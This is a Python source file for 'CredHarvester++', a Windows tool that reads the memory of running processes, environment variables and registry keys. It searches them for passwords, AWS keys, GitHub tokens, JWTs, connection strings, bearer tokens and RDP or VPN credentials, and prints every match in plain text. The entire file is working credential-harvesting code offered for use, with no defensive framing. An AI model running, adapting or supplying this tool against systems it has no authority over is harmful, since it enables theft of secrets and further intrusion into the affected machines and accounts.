import ctypes
import ctypes.wintypes as wintypes
import psutil
import re
import os
import argparse
import winreg
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# ================== Windows API ==================
PROCESS_QUERY_INFORMATION = 0x0400
PROCESS_VM_READ = 0x0010
PROCESS_ALL_ACCESS = 0x1F0FFF

kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)

OpenProcess = kernel32.OpenProcess
OpenProcess.restype = wintypes.HANDLE

ReadProcessMemory = kernel32.ReadProcessMemory
ReadProcessMemory.argtypes = [wintypes.HANDLE,
                              wintypes.LPCVOID,
                              wintypes.LPVOID,
                              ctypes.c_size_t,
                              ctypes.POINTER(ctypes.c_size_t)]
ReadProcessMemory.restype = wintypes.BOOL

VirtualQueryEx = kernel32.VirtualQueryEx
VirtualQueryEx.restype = ctypes.c_size_t

CloseHandle = kernel32.CloseHandle

# MEMORY_BASIC_INFORMATION struct
class MEMORY_BASIC_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("BaseAddress", wintypes.LPVOID),
        ("AllocationBase", wintypes.LPVOID),
        ("AllocationProtect", wintypes.DWORD),
        ("RegionSize", ctypes.c_size_t),
        ("State", wintypes.DWORD),
        ("Protect", wintypes.DWORD),
        ("Type", wintypes.DWORD)
    ]

# ================== Regex Patterns ==================
PATTERNS = {
    "password": re.compile(r"(password\s*=\s*[^\s'\";]+)", re.IGNORECASE),
    "aws_key": re.compile(r"AKIA[0-9A-Z]{16}"),
    "github_token": re.compile(r"ghp_[0-9a-zA-Z]{36}"),
    "jwt": re.compile(r"eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+"),
    "connection_string": re.compile(r"(Server=.*?;Database=.*?;User Id=.*?;Password=.*?;)", re.IGNORECASE),
    "bearer_token": re.compile(r"(Bearer\s+[A-Za-z0-9\-\._~\+\/]+=*)")
}

# ================== Process Memory Scanner ==================
def scan_process_memory(pid=None):
    findings = []
    procs = []

    if pid:
        try:
            procs = [psutil.Process(pid)]
        except psutil.NoSuchProcess:
            print(Fore.RED + f"[-] No process found with PID {pid}")
            return findings
    else:
        procs = psutil.process_iter(attrs=["pid", "name"])

    for proc in procs:
        try:
            handle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, False, proc.pid)
            if not handle:
                continue

            mbi = MEMORY_BASIC_INFORMATION()
            addr = 0
            while VirtualQueryEx(handle, ctypes.c_void_p(addr), ctypes.byref(mbi), ctypes.sizeof(mbi)):
                if mbi.State == 0x1000 and (mbi.Protect & 0x04 or mbi.Protect & 0x20 or mbi.Protect & 0x40):  
                    buf = ctypes.create_string_buffer(mbi.RegionSize)
                    bytesRead = ctypes.c_size_t(0)
                    if ReadProcessMemory(handle, mbi.BaseAddress, buf, mbi.RegionSize, ctypes.byref(bytesRead)):
                        try:
                            text = buf.raw.decode("latin-1", errors="ignore")
                            for label, pattern in PATTERNS.items():
                                for match in pattern.findall(text):
                                    findings.append({
                                        "type": "process_memory",
                                        "pid": proc.pid,
                                        "process": proc.name(),
                                        "pattern": label,
                                        "match": match
                                    })
                        except Exception:
                            pass
                addr += mbi.RegionSize
            CloseHandle(handle)

        except Exception:
            continue
    return findings

# ================== Env Variable Scanner ==================
def scan_env():
    findings = []
    envs = os.environ.copy()
    for k, v in envs.items():
        for label, pattern in PATTERNS.items():
            if pattern.search(v):
                findings.append({
                    "type": "env_var",
                    "key": k,
                    "pattern": label,
                    "match": v
                })
    return findings

# ================== Registry Scanner ==================
def scan_registry():
    findings = []
    hives = {
        "HKCU": winreg.HKEY_CURRENT_USER,
        "HKLM": winreg.HKEY_LOCAL_MACHINE
    }

    interesting_keys = [
        r"Software\Microsoft\Terminal Server Client",  # RDP creds
        r"Software\OpenVPN",                          # VPN creds
        r"Software\MyApp"                             # placeholder for testing
    ]

    for hive_name, hive in hives.items():
        for path in interesting_keys:
            try:
                key = winreg.OpenKey(hive, path)
                i = 0
                while True:
                    try:
                        name, value, _ = winreg.EnumValue(key, i)
                        for label, pattern in PATTERNS.items():
                            if isinstance(value, str) and pattern.search(value):
                                findings.append({
                                    "type": "registry",
                                    "hive": hive_name,
                                    "path": path,
                                    "name": name,
                                    "pattern": label,
                                    "match": value
                                })
                        i += 1
                    except OSError:
                        break
            except FileNotFoundError:
                continue
    return findings

# ================== Pretty Output ==================
def pretty_print(results):
    print(Fore.CYAN + Style.BRIGHT + "\n[+] CredHarvester++ Results")
    print(Fore.CYAN + "---------------------------------------------")

    if not results:
        print(Fore.RED + "[-] No credentials or tokens found.")
        return

    for r in results:
        if r["type"] == "process_memory":
            print(Fore.YELLOW + f"\n[PROCESS MEMORY] PID {r['pid']} ({r['process']})")
        elif r["type"] == "env_var":
            print(Fore.YELLOW + f"\n[ENV VAR] {r['key']}")
        elif r["type"] == "registry":
            print(Fore.YELLOW + f"\n[REGISTRY] {r['hive']}\\{r['path']} ({r['name']})")
        print(Fore.GREEN + f"  Pattern: {r['pattern']}")
        print(Fore.WHITE + f"  Match: {r['match']}")
    print(Fore.CYAN + "---------------------------------------------\n")

# ================== Main ==================
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="CredHarvester++ - Advanced Credential & Token Discovery Tool (Windows)")
    parser.add_argument("--process", action="store_true", help="Scan process memory")
    parser.add_argument("--env", action="store_true", help="Scan environment variables")
    parser.add_argument("--registry", action="store_true", help="Scan registry keys")
    parser.add_argument("--all", action="store_true", help="Run all modules")
    parser.add_argument("--pid", type=int, help="Scan specific process ID")
    args = parser.parse_args()

    results = []

    if args.process or args.all:
        if args.pid:
            print(Fore.BLUE + f"[*] Scanning memory of PID {args.pid}...")
        else:
            print(Fore.BLUE + "[*] Scanning memory of all processes...")
        results.extend(scan_process_memory(args.pid))

    if args.env or args.all:
        print(Fore.BLUE + "[*] Scanning environment variables...")
        results.extend(scan_env())

    if args.registry or args.all:
        print(Fore.BLUE + "[*] Scanning registry keys...")
        results.extend(scan_registry())

    pretty_print(results)
